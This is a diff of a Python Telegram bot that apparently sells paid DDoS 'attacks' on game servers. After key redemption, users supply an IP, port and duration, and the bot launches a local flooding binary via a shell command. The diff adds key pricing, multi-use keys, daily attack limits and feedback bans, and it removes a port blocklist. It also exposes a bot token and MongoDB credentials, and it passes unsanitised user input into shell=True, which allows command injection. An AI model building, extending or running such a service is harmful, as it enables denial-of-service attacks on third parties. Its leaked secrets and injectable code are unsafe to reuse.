@@ -1,5 +1,5 @@
 from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from telegram.ext import Updater, CommandHandler
 from datetime import datetime, timedelta
 import subprocess
 import time  # Import time for sleep functionalit
@@ -8,6 +8,8 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from pymongo import MongoClient
 import random 
 import string
+from telegram.ext import CallbackQueryHandler
+from telegram.ext import MessageHandler, filters
 
 # Bot token
 BOT_TOKEN = '7960283920:AAF3cS48v-urzoXsjhgNPj27Rp8w1qEfuLc'  # Replace with your bot token
@@ -20,11 +22,11 @@ ADMIN_USERNAME = "❄️DAKU BHAIZ❄️"
 ADMIN_CONTACT = "@DAKUxBHAIZ"
 
 # MongoDB Connection
-MONGO_URL = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
+MONGO_URL = "mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv"
 client = MongoClient(MONGO_URL)
 
 # Database and Collection
-db = client["dake"]  # Database name
+db = client["dakufree"]  # Database name
 collection = db["Users"]  # Collection name
 key_collection = db["Keys"]  # Collection for storing keys
 
@@ -32,7 +34,7 @@ key_collection = db["Keys"]  # Collection for storing keys
 recent_attacks = {}
 
 # Cooldown period in seconds
-COOLDOWN_PERIOD = 180
+COOLDOWN_PERIOD = 1
 
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     admin = collection.find_one({"user_id": update.effective_user.id})
@@ -338,8 +340,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📜 *Type /help to see available commands.*\n\n"
         "💫 The owner of this bot is ❄️DAKU BHAIZ❄️. Contact @DAKUxBHAIZ."
     )
-    await update.message.reply_text(welcome_message, parse_mode='Markdown',
-    reply_markup=get_default_buttons())
+    await update.message.reply_text(welcome_message, parse_mode='Markdown')
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -365,8 +366,6 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "/removeadmin - Remove admin\n"
             "/broadcast - Send Massage\n"
             "/users - See Users\n"
-            "/uptime - See Bot Uptime\n"
-            "/setcooldown - Set cooldown Time\n"
         )
     elif user_data and user_data.get("is_admin"):
         help_message = (
@@ -397,84 +396,90 @@ async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     admin_data = collection.find_one({"user_id": user_id})
     
-    # Super Admin direct access
-    if user_id == ADMIN_ID:
-        is_super_admin = True
-    else:
-        is_super_admin = False
+    # ✅ Super Admin check
+    is_super_admin = user_id == ADMIN_ID
 
-    # Normal Admin check
+    # ✅ Normal Admin check
     if not is_super_admin and (not admin_data or not admin_data.get("is_admin")):
         await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
         return
 
     try:
-        # Super Admin allows minutes/hours/days
+        # ✅ Command format: /gen <duration> <max_uses>
         duration_input = context.args[0]  # e.g., "30m", "2h", "7d"
-        duration_value = int(duration_input[:-1])  # Extract numeric part
-        duration_unit = duration_input[-1].lower()  # Extract unit ('m', 'h', 'd')
+        max_uses = int(context.args[1])  # Max number of users who can use the key
 
-        if not is_super_admin and duration_unit != "d":  # Normal Admin restriction
+        # ✅ Validate duration format
+        duration_value = int(duration_input[:-1])  
+        duration_unit = duration_input[-1].lower()
+
+        if not is_super_admin and duration_unit != "d":  # Normal Admins can only generate in days
             await update.message.reply_text(
                 "❌ *Normal admins can only generate keys for fixed days: 1, 3, 7, 30.*",
                 parse_mode="Markdown"
             )
             return
 
-        # Calculate duration in seconds
-        if duration_unit == "m":  # Minutes
-            duration_seconds = duration_value * 60
-        elif duration_unit == "h":  # Hours
-            duration_seconds = duration_value * 3600
-        elif duration_unit == "d":  # Days
-            duration_seconds = duration_value * 86400
-        else:
+        # ✅ Convert duration to seconds
+        duration_seconds = {
+            "m": duration_value * 60,
+            "h": duration_value * 3600,
+            "d": duration_value * 86400
+        }.get(duration_unit)
+
+        if duration_seconds is None:
             await update.message.reply_text("❌ *Invalid duration format. Use `m`, `h`, or `d`.*", parse_mode="Markdown")
             return
 
-        # Pricing logic for Normal Admin
-        pricing = {1: 75, 3: 195, 7: 395, 30: 715}  # Days-based pricing
+        # ✅ Pricing logic for Normal Admin
+        pricing = {1: 75, 3: 195, 7: 395, 30: 715}
         price = pricing.get(duration_value) if duration_unit == "d" else None
 
-        if not is_super_admin:  # Normal Admin pricing logic
+        if not is_super_admin:
             if price is None:
-                await update.message.reply_text(
-                    "❌ *Invalid duration. Choose from: 1, 3, 7, 30 days.*",
-                    parse_mode="Markdown"
-                )
+                await update.message.reply_text("❌ *Invalid duration. Choose from: 1, 3, 7, 30 days.*", parse_mode="Markdown")
                 return
 
             balance = admin_data.get("balance", 0)
-            if balance < price:
+            total_price = price * max_uses  # Price per user * number of users
+
+            if balance < total_price:
                 await update.message.reply_text(
-                    f"❌ *Insufficient balance!*\n💳 Current Balance: ₹{balance}\n💰 Required: ₹{price}",
+                    f"❌ *Insufficient balance!*\n💳 Current Balance: ₹{balance}\n💰 Required: ₹{total_price}",
                     parse_mode="Markdown"
                 )
                 return
-            # Deduct balance
-            collection.update_one({"user_id": user_id}, {"$inc": {"balance": -price}})
+
+            # ✅ Deduct balance
+            collection.update_one({"user_id": user_id}, {"$inc": {"balance": -total_price}})
         
-        # Generate random key
+        # ✅ Generate random key
         key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
 
-        # Save key to database
+        # ✅ Save key to database with max_uses
         key_collection.insert_one({
             "key": key,
             "duration_seconds": duration_seconds,
             "generated_by": user_id,
-            "is_redeemed": False
+            "is_redeemed": False,
+            "max_uses": max_uses,  # ✅ How many users can redeem this key
+            "redeemed_by": []  # ✅ List of user IDs who used this key
         })
 
         await update.message.reply_text(
-            f"✅ *Key Generated Successfully!*\n🔑 Key: `{key}`\n⏳ Validity: {duration_value} {'minute(s)' if duration_unit == 'm' else 'hour(s)' if duration_unit == 'h' else 'day(s)'}\n💳 Cost: ₹{price if not is_super_admin else 'Free'}",
+            f"✅ *Key Generated Successfully!*\n🔑 Key: `{key}`\n"
+            f"⏳ Validity: {duration_value} {'minute(s)' if duration_unit == 'm' else 'hour(s)' if duration_unit == 'h' else 'day(s)'}\n"
+            f"👥 Usable by: {max_uses} users\n"
+            f"💳 Cost: ₹{total_price if not is_super_admin else 'Free'}",
             parse_mode="Markdown"
         )
+
     except (IndexError, ValueError):
         await update.message.reply_text(
-            "❌ *Usage: /gen <duration>*\n\n"
+            "❌ *Usage: /gen <duration> <max_uses>*\n\n"
             "📑Examples:\n"
-            "1 Day = ₹75\n3 Days = ₹195\n7 Days = ₹395\n30 Days = ₹715\n\n"
-            "/𝙜𝙚𝙣 1𝙙 <-- 𝘼𝙖𝙞𝙨𝙚 𝘿𝙖𝙡𝙤 𝙆𝙚𝙮 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚 𝙆𝙖𝙧𝙣𝙚 𝙆𝙚 𝙇𝙞𝙮𝙚",
+            "`/gen 1d 5` (1 day key for 5 users)\n"
+            "`/gen 3d 10` (3 days key for 10 users)",
             parse_mode="Markdown"
         )
         
@@ -485,27 +490,46 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
         key_data = key_collection.find_one({"key": key, "is_redeemed": False})
 
         if not key_data:
-            await update.message.reply_text("❌ *Invalid or already redeemed key.*", parse_mode="Markdown")
+            await update.message.reply_text("❌ *Invalid or already expired key.*", parse_mode="Markdown")
             return
 
-        # Calculate expiration date
+        # ✅ Check if key limit is reached
+        max_uses = key_data.get("max_uses", 1)
+        redeemed_by = key_data.get("redeemed_by", [])
+
+        if user_id in redeemed_by:
+            await update.message.reply_text("⚠️ *You have already used this key!*", parse_mode="Markdown")
+            return
+
+        if len(redeemed_by) >= max_uses:
+            await update.message.reply_text("❌ *Key redemption limit reached!*", parse_mode="Markdown")
+            return
+
+        # ✅ Calculate expiration date
         duration_seconds = key_data["duration_seconds"]
         expiration_date = datetime.now() + timedelta(seconds=duration_seconds)
 
-        # Update user expiration date
+        # ✅ Update user expiration date
         collection.update_one(
             {"user_id": user_id},
             {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
             upsert=True
         )
 
-        # Mark key as redeemed
-        key_collection.update_one({"key": key}, {"$set": {"is_redeemed": True}})
+        # ✅ Add user to redeemed list
+        key_collection.update_one({"key": key}, {"$push": {"redeemed_by": user_id}})
+
+        # ✅ If all slots are used, mark key as redeemed
+        if len(redeemed_by) + 1 >= max_uses:
+            key_collection.update_one({"key": key}, {"$set": {"is_redeemed": True}})
 
         await update.message.reply_text(
-            f"✅ *Key Redeemed Successfully!*\n🔑 Key: `{key}`\n⏳ Access Expires: {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
+            f"✅ *Key Redeemed Successfully!*\n🔑 Key: `{key}`\n"
+            f"⏳ Access Expires: {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"👥 Remaining uses: {max_uses - len(redeemed_by) - 1}",
             parse_mode="Markdown"
         )
+
     except IndexError:
         await update.message.reply_text(
             "❌ *Usage: /redeem <key>*",
@@ -574,18 +598,17 @@ async def removecoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown"
         )
 
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from datetime import datetime, timedelta
 import asyncio
 import subprocess
 
-# Global variables to track current attack
-current_attack_user = None  # Tracks the current user attacking
-current_attack_end_time = None  # Tracks when the current attack will end
+# Admin ID & Channel Details
+ADMIN_ID = 1944182800  
+FEEDBACK_CHANNEL = "@feedbackchanneldaku"
+CHANNEL_USERNAME = "@DAKUxBHAI"
+CHANNEL_LINK = "https://t.me/DAKUxBHAI"
 
-# Global variable for attack time limit (default: 240 seconds)
-attack_time_limit = 240
-
-# Command to set the attack limit dynamically
 async def set_attack_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
@@ -602,72 +625,92 @@ async def set_attack_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except (IndexError, ValueError):
         await update.message.reply_text("❌ *Usage: /setattacklimit <duration_in_seconds>*", parse_mode="Markdown")
 
-import asyncio
-from datetime import datetime, timedelta
+# Attack Settings
+current_attack_user = None  
+current_attack_end_time = None  
+attack_time_limit = 300
+attack_cooldown = {}  
+COOLDOWN_PERIOD = 1  
+user_feedback_required = {}  
+user_bans = {}  
+BAN_DURATION = timedelta(minutes=5)  
+user_attack_count = {}  # {user_id: (date, count)}
+ATTACK_LIMIT = 200  # Ek din me max attack limit
+bot_maintenance = False  # Bot maintenance state
+user_last_photo = {}  # {user_id: last_photo_id}
 
-import asyncio
-from datetime import datetime, timedelta
-
-import asyncio
-from datetime import datetime, timedelta
-
-attack_cooldown = {}  # {user_id: cooldown_end_time}
-COOLDOWN_PERIOD = 600  # Default cooldown = 10 minutes
-
-async def update_attack_timer(context, chat_id, message_id, start_time, duration, ip, port, user_name, user_id):
-    while True:
-        remaining_time = int((start_time + timedelta(seconds=duration) - datetime.now()).total_seconds())
-        if remaining_time <= 0:
-            break
-        try:
-            await context.bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=f"🚀 *ATTACK IN PROGRESS*\n"
-                     f"🌐 *IP:* {ip}\n"
-                     f"🎯 *PORT:* {port}\n"
-                     f"👤 *User:* {user_name} (ID: {user_id})\n\n"
-                     f"⏳ *Remaining Time:* {remaining_time} seconds\n\n"
-                     "⚠️ Please wait...",
-                parse_mode="Markdown"
-            )
-        except:
-            break
-        await asyncio.sleep(1)
-
-async def set_cooldown(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Command to update cooldown period dynamically."""
-    global COOLDOWN_PERIOD
-
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("🚫 *You are not authorized to change cooldown.*", parse_mode="Markdown")
-        return
-
+# ✅ Check if User is in Channel
+async def is_user_in_channel(user_id, bot):
     try:
-        new_cooldown = int(context.args[0])
-        if new_cooldown < 0:
-            await update.message.reply_text("⚠️ *Cooldown time must be 0 or greater.*", parse_mode="Markdown")
-            return
+        chat_member = await bot.get_chat_member(CHANNEL_USERNAME, user_id)
+        return chat_member.status in ["member", "administrator", "creator"]
+    except:
+        return False
 
-        COOLDOWN_PERIOD = new_cooldown
-        await update.message.reply_text(f"✅ *Cooldown period updated to {new_cooldown} seconds.*", parse_mode="Markdown")
-    except (IndexError, ValueError):
-        await update.message.reply_text("❌ *Usage: /setcooldown <seconds>*", parse_mode="Markdown")
+# ✅ Channel Join Button
+async def join_channel(update: Update, context):
+    user_id = update.effective_user.id
 
+    if await is_user_in_channel(user_id, context.bot):
+        await update.callback_query.message.edit_text("✅ *You have joined the channel! Now you can use the bot.*", parse_mode="Markdown")
+    else:
+        await update.callback_query.answer("🚫 You haven't joined the channel yet!", show_alert=True)
+
+# ✅ Attack Command with Channel Check & Button
 async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global current_attack_user, current_attack_end_time, attack_cooldown
+    global current_attack_user, current_attack_end_time
 
     user_id = update.effective_user.id
     user_name = update.effective_user.first_name
+    now = datetime.now()
 
-    if not is_user_approved(user_id):
+    # ✅ Bot Maintenance Check
+    if bot_maintenance:
+        await update.message.reply_text("⚠️ *Bot is under maintenance. Try again later!*", parse_mode="Markdown")
+        return
+
+    # ✅ Pehle Check Karo Ki User Channel Join Kiya Ya Nahi
+    if not await is_user_in_channel(user_id, context.bot):
+        keyboard = [[InlineKeyboardButton("💖 Join Channel 💖", url=CHANNEL_LINK)],
+                    [InlineKeyboardButton("✅ I Have Joined", callback_data="join_check")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
         await update.message.reply_text(
-            "🚫 *You are not authorized to use this command.*\n"
-            "💬 *Please contact the admin if you believe this is an error.*",
-            parse_mode="Markdown",
+            "🚫 *You must join our channel before using this command!*\n"
+            f"🔗 *Join here:* [Click Here]({CHANNEL_LINK})",
+            parse_mode="Markdown", reply_markup=reply_markup
         )
         return
 
+    # ✅ Agar user banned hai aur abhi tak ban period khatam nahi hua
+    if user_id in user_bans and now < user_bans[user_id]:
+        remaining_time = (user_bans[user_id] - now).total_seconds()
+        minutes, seconds = divmod(remaining_time, 60)
+        await update.message.reply_text(
+            f"⚠️ 𝘼𝙖𝙥 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙣𝙖𝙝𝙞 𝙙𝙞𝙮𝙚, {int(minutes)} min {int(seconds)} 𝙨𝙚𝙘 𝙩𝙖𝙠 𝙗𝙖𝙣 𝙝𝙖𝙞𝙣!",
+            parse_mode="Markdown"
+        )
+        return
+
+    # ✅ Daily Attack Limit Check
+    if user_id in user_attack_count:
+        last_attack_date, attack_count = user_attack_count[user_id]
+        if last_attack_date.date() == now.date():  
+            if attack_count >= ATTACK_LIMIT:
+                await update.message.reply_text("⚠️ *You have reached your daily attack limit!*", parse_mode="Markdown")
+                return
+        else:
+            user_attack_count[user_id] = (now, 0)  # Reset count if new day
+    else:
+        user_attack_count[user_id] = (now, 0)  # First attack of the day
+
+    # ✅ Agar user ko feedback dena tha aur usne nahi diya, toh ab ban lagao
+    if user_feedback_required.get(user_id, False):
+        user_bans[user_id] = now + BAN_DURATION  # 2 Hour Ban
+        del user_feedback_required[user_id]  
+        await update.message.reply_text("🚫 𝗔𝗮𝗽 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸 𝗻𝗮𝗵𝗶 𝗱𝗶𝘆𝗲, 5 𝗺𝗶𝗻 𝗸𝗲 𝗹𝗶𝘆𝗲 𝗯𝗮𝗻 𝗵𝗼 𝗴𝗮𝘆𝗲!")
+        return
+
+    # ✅ Agar ek attack already chal raha hai
     if current_attack_user is not None:
         remaining_time = (current_attack_end_time - datetime.now()).total_seconds()
         if remaining_time > 0:
@@ -683,54 +726,46 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
             current_attack_user = None
             current_attack_end_time = None
 
+    # ✅ Normal attack validation
+    if not is_user_approved(user_id):
+        await update.message.reply_text(
+            "🚫 *You are not authorized to use this command.*\n"
+            "💬 *Please contact the admin if you believe this is an error.*",
+            parse_mode="Markdown",
+        )
+        return
+
     if len(context.args) != 3:
         await update.message.reply_text("⚠️ *Usage:* /bgmi <ip> <port> <duration>", parse_mode="Markdown")
         return
 
-    ip = context.args[0]
-    port = context.args[1]
-    try:
-        time_duration = int(context.args[2])
-    except ValueError:
-        await update.message.reply_text("⚠️ *Invalid duration.*", parse_mode="Markdown")
-        return
-
-    if port in ["20001", "20002", "17500", "20000"] or len(port) == 3:
-        await update.message.reply_text(f"🚫 *Port {port} is not allowed.*", parse_mode="Markdown")
-        return
+    ip, port, time_duration = context.args[0], context.args[1], int(context.args[2])
 
     if time_duration > attack_time_limit:
-        await update.message.reply_text(f"⚠️ *Max attack time is {attack_time_limit} seconds.*", parse_mode="Markdown")
+        await update.message.reply_text(f"⚠️ *You cannot attack for more than {attack_time_limit} seconds.*", parse_mode="Markdown")
         return
 
-    if user_id in attack_cooldown:
-        remaining_time = (attack_cooldown[user_id] - datetime.now()).total_seconds()
-        if remaining_time > 0:
-            await update.message.reply_text(
-                f"⏳ *You must wait {int(remaining_time)} seconds before starting another attack!*",
-                parse_mode="Markdown",
-            )
-            return
-
-    attack_cooldown[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_PERIOD)
-
+    # ✅ Set current attack user
     current_attack_user = user_id
-    current_attack_end_time = datetime.now() + timedelta(seconds=time_duration)
+    current_attack_end_time = now + timedelta(seconds=time_duration)
 
-    # Pehle message bhejke uska ID lete hain, fir usko edit karenge
-    message = await update.message.reply_text("🚀 *Starting Attack...*", parse_mode="Markdown")
+    await update.message.reply_text(
+        f"🚀 *ATTACK STARTED*\n"
+        f"🌐 *IP:* {ip}\n"
+        f"🎯 *PORT:* {port}\n"
+        f"⏳ *DURATION:* {time_duration} seconds\n"
+        f"👤 *User:* {user_name} (ID: {user_id})\n\n"
+        "⚠️ *After attack, send feedback photo, otherwise you will be banned!*",
+        parse_mode="Markdown",
+    )
 
-    # Start live countdown
-    asyncio.create_task(update_attack_timer(
-        context, update.message.chat_id, message.message_id, datetime.now(), time_duration, ip, port, user_name, user_id
-    ))
     asyncio.create_task(run_attack(ip, port, time_duration, update, user_id))
     
 async def run_attack(ip, port, time_duration, update, user_id):
     global current_attack_user, current_attack_end_time, attack_cooldown
 
     try:
-        command = f"./bgmi {ip} {port} {time_duration} {15} {default_thread}"
+        command = f"./daku {ip} {port} {time_duration} {15} {default_thread}"
         process = subprocess.Popen(command, shell=True)
 
         await asyncio.sleep(time_duration)
@@ -756,6 +791,63 @@ async def run_attack(ip, port, time_duration, update, user_id):
     except Exception as e:
         print(f"Error in run_attack: {e}")
         await update.message.reply_text(f"⚠️ *Attack Error:* {str(e)}", parse_mode="Markdown")
+
+# ✅ Feedback Handling & Duplicate Photo Ban
+async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global user_feedback_required, user_bans, user_last_photo
+
+    user_id = update.effective_user.id
+    photo_id = update.message.photo[-1].file_id
+
+    # ✅ Duplicate Photo Check
+    if user_last_photo.get(user_id) == photo_id:
+        user_bans[user_id] = datetime.now() + BAN_DURATION
+        await update.message.reply_text("🚫 *Same photo detected twice! You are banned for 20 Minutes!*", parse_mode="Markdown")
+        return
+
+    user_last_photo[user_id] = photo_id  
+
+    await context.bot.forward_message(ADMIN_ID, update.message.chat_id, update.message.message_id)
+    await context.bot.forward_message(FEEDBACK_CHANNEL, update.message.chat_id, update.message.message_id)
+
+    if user_feedback_required.get(user_id, False):
+        user_feedback_required[user_id] = False  
+        await update.message.reply_text("✅ *Feedback received! You can attack again.*", parse_mode="Markdown")
+
+# ✅ Enable/Disable Bot Maintenance Mode
+async def maintenance_mode(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global bot_maintenance
+
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
+        return
+
+    command = context.args[0].lower() if context.args else ""
+    bot_maintenance = False if command == "on" else True
+    await update.message.reply_text(f"✅ *Bot maintenance mode {'Disabled' if command == 'on' else 'Enabled'}!*", parse_mode="Markdown")
+            
+async def clear_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global current_attack_user, current_attack_end_time, current_attack_process
+
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
+        return
+
+    if current_attack_user is None:
+        await update.message.reply_text("⚠️ *No active attack to clear.*", parse_mode="Markdown")
+        return
+
+    # Kill the running attack process
+    if current_attack_process:
+        current_attack_process.terminate()
+        current_attack_process.wait()
+        current_attack_process = None  # Reset process tracking
+
+    # Reset attack tracking variables
+    current_attack_user = None
+    current_attack_end_time = None
+
+    await update.message.reply_text("✅ *Attack has been forcefully stopped by the admin.*", parse_mode="Markdown")
     
 # Default thread value
 default_thread = "1000"
@@ -789,7 +881,7 @@ async def howtoattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # Command for /canary
 async def canary(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
-        [InlineKeyboardButton("📱Android Canary📱", url="https://t.me/DAKUxBHAI/1645")],
+        [InlineKeyboardButton("📱Android Canary📱", url="https://t.me/DAKUBHAIZ/143")],
         [InlineKeyboardButton("🍎iOS Canary🍎", url="https://apps.apple.com/in/app/surge-5/id1442620678")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -823,68 +915,51 @@ async def owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"✉️ *Contact:* {ADMIN_CONTACT}\n\n", parse_mode='Markdown'
     )
 
-import asyncio
+async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_data = collection.find_one({"user_id": user.id})
+    now = datetime.now()
 
-async def update_myinfo_timer(context, chat_id, message_id, user):
-    while True:
-        user_data = collection.find_one({"user_id": user.id})
-        now = datetime.now()
+    # Check if the user is approved
+    if user_data and "expiration_date" in user_data:
+        expiration_date = user_data["expiration_date"]
 
-        if user_data and "expiration_date" in user_data:
-            expiration_date = user_data["expiration_date"]
-
-            # Convert expiration date to IST
-            ist_expiration = expiration_date + timedelta(hours=5, minutes=30)
+        # Convert expiration date to IST
+        ist_expiration = expiration_date + timedelta(hours=5, minutes=30)
+        
+        # Check if the expiration date is in the past
+        if expiration_date < now:
+            expiration_info = (
+                f"❌ *Your access has expired.*\n"
+                f"⏳ *Expired On:* {ist_expiration.strftime('%Y-%m-%d %H:%M:%S')}"
+            )
+        else:
+            # Calculate time left based on IST
             ist_now = now + timedelta(hours=5, minutes=30)
             time_left = ist_expiration - ist_now
             days, seconds = time_left.days, time_left.seconds
             hours = seconds // 3600
             minutes = (seconds % 3600) // 60
-            seconds = seconds % 60
 
-            if expiration_date < now:
-                expiration_info = (
-                    f"❌ *Your access has expired.*\n"
-                    f"⏳ *Expired On:* {ist_expiration.strftime('%Y-%m-%d %H:%M:%S')}"
-                )
-                break  # Expired ho gaya, toh update band kar do
-            else:
-                expiration_info = (
-                    f"⏳ *Access Expires On:* {ist_expiration.strftime('%Y-%m-%d %H:%M:%S')}\n"
-                    f"⌛ *Time Left:* {days} days, {hours} hours, {minutes} minutes, {seconds} seconds\n\n"
-                    "⚡ *Live updating...*"
-                )
-        else:
-            expiration_info = "❌ *You have never been approved.*"
-            break  # Agar approved hi nahi hai toh update band
-
-        info_message = (
-            "📝 *Your Information:*\n"
-            f"🔗 *Username:* @{user.username if user.username else 'N/A'}\n"
-            f"🆔 *User ID:* {user.id}\n"
-            f"👤 *First Name:* {user.first_name}\n"
-            f"👥 *Last Name:* {user.last_name if user.last_name else 'N/A'}\n\n"
-            f"{expiration_info}"
-        )
-
-        try:
-            await context.bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=info_message,
-                parse_mode="Markdown"
+            expiration_info = (
+                f"⏳ *Access Expires On:* {ist_expiration.strftime('%Y-%m-%d %H:%M:%S')}\n"
+                f"⌛ *Time Left:* {days} days, {hours} hours, {minutes} minutes"
             )
-        except:
-            break
+    else:
+        expiration_info = "❌ *You have never been approved.*"
 
-        await asyncio.sleep(1)  # Har second update karega
-
-async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    message = await update.message.reply_text("📝 *Fetching your info...*", parse_mode="Markdown")
-
-    # Start live updating countdown
-    asyncio.create_task(update_myinfo_timer(context, update.message.chat_id, message.message_id, user))
+    # User information
+    info_message = (
+        "📝 *Your Information:*\n"
+        f"🔗 *Username:* @{user.username if user.username else 'N/A'}\n"
+        f"🆔 *User ID:* {user.id}\n"
+        f"👤 *First Name:* {user.first_name}\n"
+        f"👥 *Last Name:* {user.last_name if user.last_name else 'N/A'}\n\n"
+        f"{expiration_info}\n"
+    )
+    
+    await update.message.reply_text(info_message, parse_mode='Markdown',
+    reply_markup=get_default_buttons())
 
 async def admincommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
@@ -938,113 +1013,36 @@ async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(f"📋 *Approved Users:*\n\n{user_list}", parse_mode="Markdown")
     
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    ApplicationBuilder,
-    CommandHandler,
-    CallbackQueryHandler,
-    MessageHandler,
-    filters,
-)
-
-QR_IMAGE_PATH = "payment_qr_code.png"  # Scanner QR file ka path
-
-plans = [
-    ("₹95 = 1 DAY ✅", "95"),
-    ("₹235 = 3 DAYS ✅", "235"),
-    ("₹385 = 1 WEEK ✅", "385"),
-    ("₹665 = 15 DAYS ✅", "665"),
-    ("₹845 = 1 MONTH ✅", "845"),
-    ("₹1,335 = FULL SEASON ✅", "1335"),
-]
-
-async def start_buy(update: Update, context):
-    keyboard = [[InlineKeyboardButton(text, callback_data=price)] for text, price in plans]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text("Select apna plan niche se:", reply_markup=reply_markup)
-
-async def handle_plan_selection(update: Update, context):
-    query = update.callback_query
-    await query.answer()
-    selected_plan = query.data
-
-    # Stylish and user-friendly message with QR image
-    with open("payment_qr_code.png", "rb") as qr:
-        await context.bot.send_photo(
-            chat_id=query.message.chat_id,
-            photo=qr,
-            caption=(
-                f"🎉 *Plan Selected:* ₹{selected_plan}\n\n"
-                "🟢 *Next Steps:*\n"
-                "1️⃣ 𝙌𝙍 𝙘𝙤𝙙𝙚 𝙠𝙤 𝙨𝙘𝙖𝙣 𝙠𝙖𝙧𝙠𝙚 𝙥𝙖𝙮𝙢𝙚𝙣𝙩 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚 𝙠𝙖𝙧𝙤.\n"
-                "2️⃣ 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙝𝙤𝙣𝙚 𝙠𝙚 𝙗𝙖𝙖𝙙 𝙐𝙨𝙠𝙖 𝙨𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩 𝙡𝙚 𝙡𝙤.\n"
-                "3️⃣ 𝙁𝙞𝙧 𝙒𝙤 𝙨𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩 𝙄𝙨 𝘽𝙤𝙩 𝙈𝙚 𝙃𝙞 𝙎𝙚𝙣𝙙 𝙆𝙖𝙧𝙙𝙤.\n\n"
-                "⚠️ Note: 𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗵𝗼𝗻𝗲 𝗸𝗲 𝗯𝗮𝗮𝗱 𝗮𝗮𝗽𝗸𝗮 𝗽𝗹𝗮𝗻 𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗸𝗮𝗿 𝗱𝗶𝘆𝗮 𝗷𝗮𝘆𝗲𝗴𝗮.\n"
-                "💬 *Support Contact:* @DAKUxBHAIZ"
-            ),
-            parse_mode="Markdown"
-        )
-
-async def handle_payment_screenshot(update: Update, context):
-    user_info = update.message.from_user
-    photo = await update.message.photo[-1].get_file()
-    photo_path = f"{user_info.id}_payment.jpg"
-    await photo.download_to_drive(photo_path)
-
-    # Admin ko forward karna
-    await context.bot.send_message(
-        chat_id=ADMIN_ID,
-        text=f"Payment screenshot received:\nUser: @{user_info.username or 'NoUsername'} ({user_info.id})",
-    )
-    await context.bot.send_photo(chat_id=ADMIN_ID, photo=open(photo_path, "rb"))
-    await update.message.reply_text("✅ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗿𝗲𝗰𝗲𝗶𝘃𝗲 𝗵𝗼 𝗴𝗮𝘆𝗮 𝗵𝗮𝗶! 🔍 𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗸𝗲 𝗯𝗮𝗮𝗱 𝗮𝗮𝗽𝗸𝗮 𝗽𝗹𝗮𝗻 𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗸𝗮𝗿 𝗱𝗶𝘆𝗮 𝗷𝗮𝘆𝗲𝗴𝗮. 𝗗𝗵𝗮𝗻𝘆𝗮𝘄𝗮𝗮𝗱!")
-    
-import asyncio
 import time
 
 # Bot start hone ka time track karne ke liye
 start_time = time.time()
 
-async def update_uptime_timer(context, chat_id, message_id):
-    while True:
-        current_time = time.time()
